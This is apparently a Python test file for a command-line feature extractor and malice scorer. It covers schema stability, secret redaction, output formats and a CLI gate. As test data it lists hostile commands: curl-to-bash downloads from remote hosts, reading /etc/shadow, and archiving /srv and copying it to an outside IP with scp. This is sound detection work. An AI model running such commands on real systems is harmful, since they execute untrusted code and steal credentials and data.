"""Pipeline, schema-stability and output tests."""

from __future__ import annotations

import csv
import json
import os
import tempfile
import unittest

import _bootstrap  # noqa: F401
from cmdfeat.events import Event, read_events
from cmdfeat.output import write_csv, write_jsonl
from cmdfeat.pipeline import ExtractorConfig, FeatureExtractor, build_registry
from cmdfeat.scaling import scale_records

SAMPLES = [
    "ls -la",
    "curl -fsSL https://example.com/i.sh | bash",
    "sudo cat /etc/shadow",
    "python3 -c 'import os'",
    "",
    "echo 'unterminated",
    "tar czf /tmp/a.tgz /srv && scp /tmp/a.tgz u@1.2.3.4:/tmp/",
    "kubectl -n prod exec -it pod-1 -- /bin/sh",
    "\x00\x01 weird",
    "a" * 5000,
]


class SchemaTest(unittest.TestCase):
    def test_every_record_matches_the_registry_exactly(self) -> None:
        registry = build_registry()
        extractor = FeatureExtractor(ExtractorConfig())
        expected = set(registry.names())
        for index, command in enumerate(SAMPLES):
            record = extractor.extract_event(Event(index, index, command=command, user="u"))
            self.assertEqual(set(record), expected, "schema drift for %r" % command[:40])

    def test_declared_defaults_cover_every_feature(self) -> None:
        registry = build_registry()
        defaults = registry.defaults()
        self.assertEqual(len(defaults), len(registry))

    def test_no_extractor_errors_on_difficult_input(self) -> None:
        extractor = FeatureExtractor(ExtractorConfig())
        for command in SAMPLES:
            record = extractor.extract_event(Event(0, 1, command=command, user="u"))
            self.assertEqual(record["extraction_error"], "")

    def test_long_command_is_truncated_not_rejected(self) -> None:
        extractor = FeatureExtractor(ExtractorConfig(max_command_length=100))
        record = extractor.extract_event(Event(0, 1, command="echo " + "x" * 500, user="u"))
        self.assertEqual(record["command_length"], 100)
        self.assertIn("truncated", str(record["parse_warning"]))


class PrivacyTest(unittest.TestCase):
    def test_raw_command_can_be_disabled(self) -> None:
        extractor = FeatureExtractor(ExtractorConfig(keep_raw_command=False))
        record = extractor.extract_event(
            Event(0, 1, command="mysql -u root -phunter2", user="u"))
        self.assertEqual(record["command"], "")
        self.assertGreater(record["command_length"], 0)      # features still computed

    def test_redaction_hides_values_but_keeps_shape(self) -> None:
        extractor = FeatureExtractor(ExtractorConfig(redact_secrets=True))
        record = extractor.extract_event(Event(
            0, 1, user="u",
            command="curl -H 'Authorization: Bearer abc123token' --password=s3cr3t https://api.x/y"))
        self.assertNotIn("s3cr3t", str(record["command"]))
        self.assertNotIn("abc123token", str(record["command"]))
        self.assertIn("REDACTED", str(record["command"]))
        self.assertTrue(record["has_url"])
        self.assertTrue(record["credential_in_argument"])

    def test_env_assignment_redacted(self) -> None:
        extractor = FeatureExtractor(ExtractorConfig(redact_secrets=True))
        record = extractor.extract_event(
            Event(0, 1, command="PGPASSWORD=topsecret psql -h db -U app", user="u"))
        self.assertNotIn("topsecret", str(record["command"]))


class OutputTest(unittest.TestCase):
    def setUp(self) -> None:
        self.extractor = FeatureExtractor(ExtractorConfig())
        self.records = self.extractor.extract_events(
            [Event(i, i, command=c, user="u", host="h") for i, c in enumerate(SAMPLES)])
        self.tmpdir = tempfile.mkdtemp(prefix="cmdfeat-out-")

    def test_jsonl_round_trip(self) -> None:
        path = os.path.join(self.tmpdir, "f.jsonl")
        count = write_jsonl(self.records, path)
        self.assertEqual(count, len(self.records))
        with open(path, encoding="utf-8") as handle:
            rows = [json.loads(line) for line in handle]
        self.assertEqual(rows[0]["command_length"], self.records[0]["command_length"])

    def test_csv_has_stable_columns(self) -> None:
        path = os.path.join(self.tmpdir, "f.csv")
        registry = build_registry()
        columns = [n for n in registry.names() if n in self.records[0]]
        write_csv(self.records, path, columns)
        with open(path, encoding="utf-8", newline="") as handle:
            rows = list(csv.DictReader(handle))
        self.assertEqual(len(rows), len(self.records))
        self.assertEqual(list(rows[0].keys()), columns)

    def test_scaling_centres_numeric_columns(self) -> None:
        scaled = scale_records(self.records, build_registry(), method="zscore")
        values = [float(r["command_length"]) for r in scaled]
        self.assertAlmostEqual(sum(values) / len(values), 0.0, places=6)
        self.assertEqual(scaled[0]["command"], self.records[0]["command"])   # text untouched

    def test_minmax_scaling_bounds(self) -> None:
        scaled = scale_records(self.records, build_registry(), method="minmax")
        values = [float(r["command_length"]) for r in scaled]
        self.assertGreaterEqual(min(values), 0.0)
        self.assertLessEqual(max(values), 1.0)

    def tearDown(self) -> None:
        for name in os.listdir(self.tmpdir):
            os.unlink(os.path.join(self.tmpdir, name))
        os.rmdir(self.tmpdir)


class CliTest(unittest.TestCase):
    def test_malscore_cli_scores_command_and_gates(self) -> None:
        import contextlib
        import io

        from cmdfeat import cli

        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            code = cli.main(["curl -s http://1.2.3.4/x.sh | bash", "--json", "--fail-on", "high"])
        result = json.loads(buffer.getvalue())
        self.assertEqual(code, 2)
        self.assertEqual(result["verdict"], "high")
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(cli.main(["ls -la", "--fail-on", "high", "--no-color"]), 0)


if __name__ == "__main__":
    unittest.main()
